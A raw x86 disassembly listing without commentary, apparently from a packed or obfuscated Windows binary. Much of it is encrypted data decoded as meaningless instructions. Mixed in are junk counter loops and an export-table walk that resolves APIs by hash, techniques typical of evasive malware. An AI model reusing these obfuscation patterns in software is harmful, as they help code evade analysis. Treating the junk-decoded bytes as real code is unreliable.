  419ee9:	add    al,0x8c
  419eeb:	xchg   esi,eax
  419eec:	aad    0x5b
  419eee:	lds    edi,FWORD PTR [edx-0x5f]
  419ef1:	pop    ss
  419ef2:	stos   DWORD PTR es:[edi],eax
  419ef3:	rcr    bh,1
  419ef5:	jl     0x419e9d
  419ef7:	inc    ecx
  419ef8:	das    
  419ef9:	cwde   
  419efa:	fisub  WORD PTR [eax+0x4a]
  419efd:	mov    ebp,0x3d3e3efd
  419f02:	aaa    
  419f03:	inc    edi
  419f04:	das    
  419f05:	addr16 icebp 
  419f07:	ins    DWORD PTR es:[edi],dx
  419f08:	int3   
  419f09:	jo     0x419f72
  419f0b:	xchg   ebp,eax
  419f0c:	add    BYTE PTR [esi],0xd7
  419f0f:	(bad)  
  419f10:	fld    DWORD PTR [ebx]
  419f12:	outs   dx,DWORD PTR ds:[esi]
  419f13:	data16 cmp al,0x6a
  419f16:	retf   
  419f17:	sub    eax,0xb3a7fbe3
  419f1c:	sbb    al,0xa6
  419f1e:	mov    ecx,0x8a7c1386
  419f23:	sbb    ch,BYTE PTR [ecx]
  419f25:	mov    ebp,0x9dd3ab3c
  419f2a:	jmp    0x5a6776d7
  419f2f:	in     eax,dx
  419f30:	ins    BYTE PTR es:[edi],dx
  419f31:	ins    DWORD PTR es:[edi],dx
  419f32:	ins    DWORD PTR es:[edi],dx
  419f33:	into   
  419f34:	jno    0x419ec2
  419f36:	adc    esp,DWORD PTR [ebx+0x6e]
  419f39:	loopne 0x419f7f
  419f3b:	xor    eax,0x944b0c71
  419f40:	xor    eax,0x21cac12
  419f45:	loope  0x419fc6
  419f47:	push   es
  419f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f49:	mov    ds:0xf45c8f56,eax
  419f4e:	mov    esi,0x674a929e
  419f53:	rol    DWORD PTR [esi-0x32],1
  419f56:	pushf  
  419f57:	jne    0x419f44
  419f59:	dec    esp
  419f5a:	fbld   TBYTE PTR gs:[esp+eax*2-0x11]
  419f5f:	inc    edx
  419f60:	aad    0x97
  419f62:	ds add al,0xc2
  419f65:	pop    es
  419f66:	das    
  419f67:	xchg   edx,eax
  419f68:	test   DWORD PTR [edx+ebx*2-0x4b18ce84],0x2e150993
  419f73:	and    bh,bh
  419f75:	fwait
  419f76:	mov    bl,0x33
  419f78:	loop   0x419fa6
  419f7a:	jo     0x419f84
  419f7c:	les    esp,FWORD PTR [eax]
  419f7e:	mov    bh,0xef
  419f80:	punpckhwd mm7,QWORD PTR [ecx]
  419f83:	mov    bh,BYTE PTR [edi-0x31]
  419f86:	mov    bl,ch
  419f88:	fstp   QWORD PTR [ebp-0xf212c5e]
  419f8e:	dec    eax
  419f8f:	test   eax,0x2c79e4ba
  419f94:	rol    al,cl
  419f96:	mov    WORD PTR [esi],es
  419f98:	lds    esp,FWORD PTR [edx]
  419f9a:	data16 jae 0x419fc5
  419f9d:	push   eax
  419f9e:	xor    ebx,edi
  419fa0:	jne    0x41a637
  419fa6:	add    DWORD PTR ds:0x42a7c5,0x42a761
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x86
  419fdd:	pop    ecx
  419fde:	jecxz  0x419ff7
  419fe0:	adc    bl,0x7f
  419fe3:	js     0x419ff5
  419fe5:	jle    0x41a05f
  419fe7:	js     0x41a04f
  419fe9:	xchg   esp,eax
  419fea:	ja     0x41a030
  419fec:	xor    BYTE PTR [edx-0x74],al
  419fef:	mov    DWORD PTR [eax-0x107eec85],edx
  419ff5:	xor    BYTE PTR [edx+0x26],bh
  419ff8:	cmp    eax,0xe61661a6
  419ffd:	xor    DWORD PTR [edx+edx*1],edx
  41a000:	fistp  DWORD PTR [eax]
  41a002:	mov    ecx,0xb620453c
  41a007:	xchg   esp,eax
  41a008:	mov    ebx,0x1f8665f8
  41a00d:	pop    edx
  41a00e:	outs   dx,DWORD PTR ds:[esi]
  41a00f:	mov    ds:0xc0e30326,al
  41a014:	fcomp  QWORD PTR [ecx]
  41a016:	in     eax,0xba
  41a018:	sbb    ecx,DWORD PTR [ebx]
  41a01a:	push   ds
  41a01b:	fcmovnbe st,st(4)
  41a01d:	int    0xf9
  41a01f:	fisubr WORD PTR [ecx-0x6f]
  41a022:	stos   BYTE PTR es:[edi],al
  41a023:	std    
  41a024:	aam    0xf5
  41a026:	icebp  
  41a027:	push   ecx
  41a028:	mov    ebx,0x2a0256dd
  41a02d:	or     edi,0x9e6d32a8
  41a033:	test   al,0xd0
  41a035:	sbb    DWORD PTR [ebp-0x29],ebp
  41a038:	push   0x1e
  41a03a:	fstp   DWORD PTR [ecx-0x4d02cb2a]
  41a040:	adc    ebp,DWORD PTR [ebx-0x7]
  41a043:	pop    ss
  41a044:	pop    ebp
  41a045:	in     al,0xc6
  41a047:	mov    edi,0x1e9fa380
  41a04c:	mov    BYTE PTR [esi],ch
  41a04e:	jmp    0xe381:0x7fb7665c
  41a055:	imul   BYTE PTR ds:0x8a2e9952
  41a05b:	xor    dl,dh
  41a05d:	dec    edi
  41a05e:	popa   
  41a05f:	shl    DWORD PTR [ecx],1
  41a061:	sbb    bh,BYTE PTR [esi+0x66]
  41a064:	mov    ds:0x3849a6f0,al
  41a069:	fsub   st(5),st
  41a06b:	add    DWORD PTR [ecx-0x14],ebx
  41a06e:	mov    DWORD PTR [esi-0x12558ac],eax
  41a074:	sahf   
  41a075:	mov    cs,WORD PTR [ebx+0x68]
  41a078:	aas    
  41a079:	shl    BYTE PTR [ebx-0x7fb4a826],0x19
  41a080:	imul   ebp,esi,0x123a5a5e
  41a086:	into   
  41a087:	cmc    
  41a088:	and    edx,DWORD PTR [eax-0x74fcc914]
  41a08e:	in     al,dx
  41a08f:	cs jp  0x41a08f
  41a092:	push   ebp
  41a093:	test   esi,0x33cae8ba
  41a099:	pop    ebp
  41a09a:	aam    0xfd
  41a09c:	add    DWORD PTR [edx-0x41d4fd18],ecx
  41a0a2:	aaa    
  41a0a3:	stos   BYTE PTR es:[edi],al
  41a0a4:	fidiv  DWORD PTR [ebx-0x22f5717f]
  41a0aa:	push   eax
  41a0ab:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41a0ad:	mov    ds:0xe3b1da58,al
  41a0b2:	cmp    al,0x24
  41a0b4:	call   0x59dd:0x61c8a382
  41a0bb:	iret   
  41a0bc:	and    BYTE PTR [ebp+0xad26c2b],ch
  41a0c2:	inc    ebp
  41a0c3:	jae    0x41a0e0
  41a0c5:	mov    ebp,0x9e2a4e2f
  41a0ca:	leave  
  41a0cb:	jae    0x41a13a
  41a0cd:	xlat   BYTE PTR ds:[ebx]
  41a0ce:	iret   
  41a0cf:	or     dh,BYTE PTR [esi]
  41a0d1:	popf   
  41a0d2:	aam    0xc2
  41a0d4:	cmp    BYTE PTR [ebx],dh
  41a0d6:	mov    WORD PTR [eax],?
  41a0d8:	xor    DWORD PTR ds:0xfd0138df,esi
  41a0de:	xor    al,BYTE PTR [edx+0x1a]
  41a0e1:	addr16 aaa 
  41a0e3:	mov    ah,0x24
  41a0e5:	jo     0x41a0e0
  41a0e7:	shr    esp,0xdc
  41a0ea:	jae    0x41a0b4
  41a0ec:	ds inc edi
  41a0ee:	(bad)  
  41a0f0:	xchg   edi,eax
  41a0f1:	jne    0x41a101
  41a0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0f4:	daa    
  41a0f5:	push   edx
  41a0f6:	rol    BYTE PTR [ebx],0x5c
  41a0f9:	aad    0xc6
  41a0fb:	int    0x2
  41a0fd:	int    0x40
  41a0ff:	out    0x19,eax
  41a101:	sub    ch,bh
  41a103:	or     dh,cl
  41a105:	icebp  
  41a106:	in     eax,dx
  41a107:	mov    ch,0xa5
  41a109:	in     al,0x13
  41a10b:	(bad)  
  41a10c:	jbe    0x41a14c
  41a10e:	inc    ebx
  41a10f:	ror    DWORD PTR [esi-0x2c],1
  41a112:	mov    cl,0xda
  41a114:	lock xchg esi,eax
  41a116:	test   DWORD PTR [edi],esi
  41a118:	adc    ebp,DWORD PTR [ebx]
  41a11a:	pop    eax
  41a11b:	and    ebp,DWORD PTR [eax-0x64598708]
  41a121:	lahf   
  41a122:	xchg   ebx,eax
  41a123:	inc    ecx
  41a124:	sub    al,0x70
  41a126:	out    dx,al
  41a127:	or     BYTE PTR ds:0xc09e58c,al
  41a12d:	and    ecx,esi
  41a12f:	sub    ebx,DWORD PTR [eax+0x7954b2cc]
  41a135:	js     0x41a0fd
  41a137:	jns    0x41a13c
  41a139:	retf   
  41a13a:	push   cs
  41a13b:	sbb    BYTE PTR [ebp+0x4c438b28],bl
  41a141:	xor    bl,cl
  41a143:	mov    ds:0x609b5d76,al
  41a148:	pop    ebx
  41a149:	mov    edx,0x4a53a9fa
  41a14e:	inc    esi
  41a14f:	out    0x96,eax
  41a151:	mov    eax,0x157e8a57
  41a156:	test   BYTE PTR [ebx+0x3d],bl
  41a159:	inc    ebp
  41a15a:	fnsave [eax]
  41a15c:	xor    DWORD PTR [edi],ebp
  41a15e:	in     al,0xbf
  41a160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a161:	into   
  41a162:	aam    0x8c
  41a164:	ja     0x41a16d
  41a166:	jg     0x41a109
  41a168:	cmp    BYTE PTR [edi+edi*2],bh
  41a16b:	sti    
  41a16c:	test   al,0xec
  41a16e:	xor    DWORD PTR [ecx+0x5e339bf5],ebp
  41a174:	jg     0x41a19e
  41a176:	call   0xbf1c:0x535a3c66
  41a17d:	es repnz jmp 0xe0a4:0x4bf4b682
  41a186:	mov    eax,0x84073a26
  41a18b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a18c:	pop    esi
  41a18d:	(bad)  
  41a18e:	out    0x1e,eax
  41a190:	add    al,0x8
  41a192:	or     eax,0x8f30cd50
  41a197:	xor    eax,0xffffffdb
  41a19a:	mov    bl,0x9d
  41a19c:	mov    eax,ds:0xb7d2193d
  41a1a1:	ret    0x6e02
  41a1a4:	xchg   BYTE PTR [edi],al
  41a1a6:	into   
  41a1a7:	cmp    BYTE PTR [ecx+eiz*8-0x2e],dl
  41a1ab:	sbb    dh,BYTE PTR [ebp+edi*4-0x29d986e7]
  41a1b2:	cli    
  41a1b3:	jae    0x41a1cd
  41a1b5:	add    BYTE PTR [eax+0x1bae65d8],0x3e
  41a1bc:	mov    edx,0x2bbe1795
  41a1c1:	cmp    edx,edi
  41a1c3:	outs   dx,DWORD PTR ds:[esi]
  41a1c4:	imul   ebp,DWORD PTR [edx],0xffffffb0
  41a1c7:	pop    esp
  41a1c8:	int3   
  41a1c9:	imul   ecx,DWORD PTR [ecx],0xffffffd6
  41a1cc:	sti    
  41a1cd:	push   0xffffffc1
  41a1cf:	dec    esp
  41a1d0:	adc    eax,0x766ff419
  41a1d5:	sub    eax,0xfa0b9701
  41a1da:	dec    ebx
  41a1db:	stos   BYTE PTR es:[edi],al
  41a1dc:	inc    ecx
  41a1dd:	stos   DWORD PTR es:[edi],eax
  41a1de:	nop/reserved BYTE PTR [edx]
  41a1e1:	scas   al,BYTE PTR es:[edi]
  41a1e2:	inc    edi
  41a1e3:	fsub   QWORD PTR [eax+edx*8+0x79]
  41a1e7:	and    BYTE PTR [ebp+ebx*2+0x7a],0x14
  41a1ec:	push   cs
  41a1ed:	shld   DWORD PTR ds:0x21ba,edx,0x4e
  41a1f4:	fsub   st,st(7)
  41a1f6:	and    al,0xd0
  41a1f8:	dec    eax
  41a1f9:	dec    esi
  41a1fa:	inc    ebp
  41a1fb:	push   0xb87fd6d2
  41a200:	mov    eax,DWORD PTR [ebp-0x4]
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42a7b1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a235
  41a293:	fcomp  QWORD PTR [edi+eax*2-0x68]
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a2d3
  41a29f:	(bad)  
  41a2a0:	add    al,0xfe
  41a2a2:	scas   al,BYTE PTR es:[edi]
  41a2a3:	or     eax,0x58d10205
  41a2a8:	push   ebx
  41a2a9:	std    
  41a2aa:	popa   
  41a2ab:	jb     0x41a26b
  41a2ad:	call   0x198b947a
  41a2b2:	aas    
  41a2b3:	fidiv  DWORD PTR [ecx+0x65]
  41a2b6:	xor    cl,0x16
  41a2b9:	div    ebp
  41a2bb:	dec    ebp
  41a2bc:	mov    dh,0x5b
  41a2be:	and    BYTE PTR [ecx],al
  41a2c0:	in     eax,0x56
  41a2c2:	add    BYTE PTR [ecx+0x313b4393],bl
  41a2c8:	out    0xe7,eax
  41a2ca:	ins    DWORD PTR es:[edi],dx
  41a2cb:	mov    ds:0x1a37c4db,al
  41a2d0:	inc    edi
  41a2d1:	leave  
  41a2d2:	mov    fs,WORD PTR ds:0x7d775b20
  41a2d8:	xor    eax,0x86d509f0
  41a2dd:	imul   edx,esi,0x6295974b
  41a2e3:	scas   al,BYTE PTR es:[edi]
  41a2e4:	cdq    
  41a2e5:	pop    ebx
  41a2e6:	push   ds
  41a2e7:	fadd   st,st(7)
  41a2e9:	mov    ds:0xee2dea26,al
  41a2ee:	pop    es
  41a2ef:	outs   dx,BYTE PTR ds:[esi]
  41a2f0:	cs mov dl,0xf8
  41a2f3:	pop    esi
  41a2f4:	mov    edx,0x931ac18d
  41a2f9:	jp     0x41a2ef
  41a2fb:	imul   edx,DWORD PTR [ebp-0x1400fe8f],0xffffff80
  41a302:	jg     0x41a2f4
  41a304:	sub    ch,cl
  41a306:	mov    dh,BYTE PTR [esi-0x14]
  41a309:	add    DWORD PTR ds:0xd42e679f,0x1b
  41a310:	jle    0x41a2f6
  41a312:	test   al,0x85
  41a314:	pusha  
  41a315:	inc    esp
  41a316:	mov    edx,0xa0c21eb9
  41a31b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a31c:	daa    
  41a31d:	rcl    ah,cl
  41a31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a320:	mov    edi,0x4f3c12b7
  41a325:	jno    0x41a2bd
  41a327:	or     al,al
  41a329:	lea    esi,[eax]
  41a32b:	push   0x4e
  41a32d:	push   esi
  41a32e:	shl    ecx,cl
  41a330:	sahf   
  41a331:	sub    esp,ebx
  41a333:	xor    BYTE PTR [edx+esi*8],dh
  41a336:	cwde   
  41a337:	xor    eax,0x7dab82b6
  41a33c:	dec    eax
  41a33d:	pusha  
  41a33e:	cmp    DWORD PTR [edx+0x6d],edi
  41a341:	cmp    esi,DWORD PTR [ebx+edx*4-0x71b93305]
  41a348:	sub    al,0xad
  41a34a:	and    ebx,DWORD PTR [ecx]
  41a34c:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a34e:	or     eax,0x443deebf
  41a353:	mov    bh,BYTE PTR [esi-0x55]
  41a356:	cwde   
  41a357:	pop    edx
  41a358:	mov    al,ds:0x8cc1bdd4
  41a35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a35e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a35f:	pop    edx
  41a360:	outs   dx,DWORD PTR ds:[esi]
  41a361:	cwde   
  41a362:	add    ebx,edi
  41a364:	adc    al,0xa1
  41a366:	adc    dh,BYTE PTR [ebp-0x51f9c11a]
  41a36c:	xor    DWORD PTR cs:[eax],esi
  41a36f:	mov    cl,BYTE PTR [esi]
  41a371:	mov    cl,0x94
  41a373:	in     eax,dx
  41a374:	mov    bl,0x80
  41a376:	pop    esi
  41a377:	xchg   edi,eax
  41a378:	stos   BYTE PTR es:[edi],al
  41a379:	jno    0x41a36b
  41a37b:	or     eax,0xf4a694db
  41a380:	dec    edx
  41a381:	fist   WORD PTR [ebx+0x48]
  41a384:	out    dx,eax
  41a385:	adc    eax,0xc1ba49da
  41a38a:	cmp    eax,0x730892df
  41a38f:	pop    eax
  41a390:	imul   esi,esi,0x44
  41a393:	mov    esp,0x68b33630
  41a398:	mov    bl,0x5f
  41a39a:	mov    cl,0xe6
  41a39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a39d:	adc    dl,BYTE PTR [eax+0x51]
  41a3a0:	je     0x41a336
  41a3a2:	pop    ds
  41a3a3:	stos   DWORD PTR es:[edi],eax
  41a3a4:	fist   DWORD PTR ds:0xa3715be6
  41a3aa:	sahf   
  41a3ab:	arpl   WORD PTR ds:0xef198beb,cx
  41a3b1:	lahf   
  41a3b2:	sbb    DWORD PTR [edi+0xe1f8583],eax
  41a3b8:	sub    al,0x80
  41a3ba:	fnstcw WORD PTR [edi]
  41a3bc:	cmp    ch,bh
  41a3be:	int3   
  41a3bf:	fisttp DWORD PTR [edi+0x6b]
  41a3c2:	ret    0xaab0
  41a3c5:	das    
  41a3c6:	fild   DWORD PTR [edx+0x32]
  41a3c9:	inc    esp
  41a3ca:	mov    ecx,0xfdced69d
  41a3cf:	js     0x41a35d
  41a3d1:	adc    bl,BYTE PTR [edx]
  41a3d3:	cld    
  41a3d4:	jl     0x41a35f
  41a3d6:	push   cs
  41a3d7:	int    0x26
  41a3d9:	popf   
  41a3da:	and    BYTE PTR [edi],0xec
  41a3dd:	stc    
  41a3de:	sbb    al,0x1e
  41a3e0:	mov    edi,DWORD PTR [edi+0x19]
  41a3e3:	push   ecx
  41a3e4:	xchg   ebp,eax
  41a3e5:	(bad)  
  41a3e7:	dec    esi
  41a3e8:	jns    0x41a3b5
  41a3ea:	ficomp DWORD PTR [eax]
  41a3ec:	addr16 mov ecx,0x425121e4
  41a3f2:	sbb    al,0x4d
  41a3f4:	cld    
  41a3f5:	fiadd  DWORD PTR [ebp+0x3e12987c]
  41a3fb:	fmul   QWORD PTR [esi]
  41a3fd:	add    bh,ch
  41a3ff:	jl     0x41a461
  41a401:	mov    bl,0x6f
  41a403:	ret    
  41a404:	(bad)
  41a408:	or     bl,BYTE PTR ss:[ecx-0x44]
  41a40c:	fsubr  QWORD PTR [edx-0x2]
  41a40f:	daa    
  41a410:	loope  0x41a417
  41a412:	mov    esp,0x124727ac
  41a417:	xor    ebp,DWORD PTR [ecx+0x65ae6cfe]
  41a41d:	push   ebx
  41a41e:	push   es
  41a41f:	sbb    DWORD PTR [ecx+edx*2],ebx
  41a422:	fwait
  41a423:	mov    esp,0xb4ec45a5
  41a428:	call   0xee6291c5
  41a42d:	dec    ebp
  41a42e:	jg     0x41a4a0
  41a430:	aam    0xe8
  41a432:	and    al,0x7a
  41a434:	jg     0x41a3bd
  41a436:	sbb    al,0x5
  41a438:	sub    eax,0x7eeb44e4
  41a43d:	sbb    BYTE PTR [eax+ecx*8],cl
  41a440:	pop    es
  41a441:	xchg   ebp,eax
  41a442:	jne    0x41a3ea
  41a444:	jo     0x41a444
  41a446:	out    dx,eax
  41a447:	pop    ss
  41a448:	xchg   edx,eax
  41a449:	loop   0x41a404
  41a44b:	fidivr DWORD PTR [edi]
  41a44d:	lds    ebp,FWORD PTR [ebp-0x591f331e]
  41a453:	cdq    
  41a454:	xor    BYTE PTR [ecx-0x1c],dh
  41a457:	mov    al,0x2b
  41a459:	pop    ds
  41a45a:	es popa 
  41a45c:	jae    0x41a4c6
  41a45e:	pop    ecx
  41a45f:	call   0x7e84:0x5cef07ee
  41a466:	inc    eax
  41a467:	dec    esi
  41a468:	or     DWORD PTR [ebp-0x3279bcb6],ecx
  41a46e:	icebp  
  41a46f:	sar    ebp,0xed
  41a472:	mov    al,ds:0x5e24a982
  41a477:	in     al,0x65
  41a479:	mov    edi,0xbda94579
  41a47e:	xlat   BYTE PTR ds:[ebx]
  41a47f:	and    esi,DWORD PTR [eax-0x14]
  41a482:	push   eax
  41a483:	pop    esi
  41a484:	push   cs
  41a485:	retf   0xc30e
  41a488:	sub    dh,ch
  41a48a:	or     dh,0xa3
  41a48d:	in     eax,dx
  41a48e:	inc    edx
  41a48f:	mov    edx,0x60d17b05
  41a494:	pop    esp
  41a495:	bound  ebp,QWORD PTR [esi+0x6ec343e3]
  41a49b:	cmp    ebx,ebx
  41a49d:	mov    ds:0x18d59ccf,eax
  41a4a2:	mov    ch,cl
  41a4a4:	and    DWORD PTR [edi+0x3a652edb],ecx
  41a4aa:	pop    ds
  41a4ab:	ins    BYTE PTR es:[edi],dx
  41a4ac:	jmp    0x3b1e944f
  41a4b1:	(bad)  
  41a4b3:	pop    ds
  41a4b4:	cmp    eax,0xec4589f7
  41a4b9:	mov    DWORD PTR ds:0x42a75d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	in     eax,dx
  41a68f:	out    dx,al
  41a690:	xchg   edx,eax
  41a691:	call   0x78c17e46
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6d4
  41a69b:	sbb    ah,bh
  41a69d:	imul   ebx,esp,0x6d
  41a6a0:	int    0x92
  41a6a2:	add    al,0x69
  41a6a4:	rol    DWORD PTR [ecx],0x41
  41a6a7:	xchg   BYTE PTR [esi],bh
  41a6a9:	out    0xf2,al
  41a6ab:	inc    ecx
  41a6ac:	jle    0x41a6dd
  41a6ae:	in     al,dx
  41a6af:	cmc    
  41a6b0:	cmp    eax,0xdff6b4d1
  41a6b5:	outs   dx,BYTE PTR ds:[esi]
  41a6b6:	sub    eax,0x26193fb2
  41a6bb:	pop    ebp
  41a6bc:	ins    DWORD PTR es:[edi],dx
  41a6bd:	or     BYTE PTR [edx+0x584850d3],bl
  41a6c3:	cmc    
  41a6c4:	sub    eax,0x3beac9c3
  41a6c9:	pop    ss
  41a6ca:	icebp  
  41a6cb:	jbe    0x41a6ca
  41a6cd:	jne    0x41a6d4
  41a6cf:	push   esp
  41a6d0:	out    dx,eax
  41a6d1:	cli    
  41a6d2:	fmul   QWORD PTR [ecx+0x62]
  41a6d5:	inc    ecx
  41a6d6:	pop    ebp
  41a6d7:	pusha  
  41a6d8:	push   cs
  41a6d9:	sbb    bh,BYTE PTR [edi]
  41a6db:	lea    edx,[edi+0x3f44bc71]
  41a6e1:	stos   DWORD PTR es:[edi],eax
  41a6e2:	ja     0x41a674
  41a6e4:	sub    edi,0x28ec6101
  41a6ea:	cs push esp
  41a6ec:	ret    0x7c58
  41a6ef:	loop   0x41a766
  41a6f1:	addr16 pop ecx
  41a6f3:	nop
  41a6f4:	test   BYTE PTR [ecx+0x66],ch
  41a6f7:	std    
  41a6f8:	mov    ebp,DWORD PTR [edx+0x65ffa646]
  41a6fe:	and    dl,cl
  41a700:	ret    0x9d2f
  41a703:	cwde   
  41a704:	pushf  
  41a705:	sbb    dh,BYTE PTR [ebx+0x783d9c2d]
  41a70b:	xor    DWORD PTR [ecx-0x57],eax
  41a70e:	xor    ah,cl
  41a710:	int3   
  41a711:	add    al,BYTE PTR [ebx-0x19463bb6]
  41a717:	dec    esp
  41a718:	stos   BYTE PTR es:[edi],al
  41a719:	cld    
  41a71a:	sbb    edx,edx
  41a71c:	mov    eax,ds:0x87da9452
  41a721:	aad    0x7
  41a723:	mov    eax,0x520dd8cc
  41a728:	mov    al,ds:0x1f229930
  41a72d:	mov    cl,0x99
  41a72f:	es add eax,0x5d475c15
  41a735:	xor    esi,ebx
  41a737:	leave  
